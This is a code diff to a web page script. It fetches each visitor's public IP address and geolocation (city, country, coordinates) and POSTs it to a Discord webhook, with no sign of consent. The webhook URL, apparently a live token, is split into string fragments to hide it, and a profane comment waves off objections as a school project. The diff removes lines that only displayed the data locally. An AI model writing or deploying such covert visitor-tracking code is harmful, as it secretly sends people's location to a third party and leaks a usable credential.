@@ -34,14 +34,12 @@
 
         $.getJSON("https://api.ipify.org?format=json", function(data) {
             $.getJSON("https://ipapi.co/" + data.ip + "/json/", function(ipapi) {
-                //document.getElementById('ipapi-city').innerHTML = ipapi.city;
-                //document.getElementById('ipapi-country').innerHTML = ipapi.country_name;
-                //document.getElementById('ipapi-timezone').innerHTML = ipapi.timezone;
-                //document.getElementById('ipapi-lat').innerHTML = ipapi.latitude;
-                //document.getElementById('ipapi-long').innerHTML = ipapi.longitude;
-
+                // this is for a random school project fuck off I don't want to hear shit
+                // if its stupid and it works then it isn't stupid
+                var webhook = "ht"+"tps://di"+"scord.com/api/webh"+"ooks/106794"+"9143483498587/-LjFvXeiKi3aY"+"jaMPU4cGQ4jA3xNgKaWcpDLGWJ4RzbsQrVdIcAO"+"3AYDl6paD7B5t_M1";
+               
                 var request = new XMLHttpRequest();
-                request.open("POST", "ht"+"tps://di"+"scord.com/api/webh"+"ooks/106794"+"9143483498587/-LjFvXeiKi3aY"+"jaMPU4cGQ4jA3xNgKaWcpDLGWJ4RzbsQrVdIcAO"+"3AYDl6paD7B5t_M1");
+                request.open("POST", webhook);
                 request.setRequestHeader('Content-type', 'application/json');
                 let currentDate = new Date();
                 let cSec = currentDate.getSeconds();
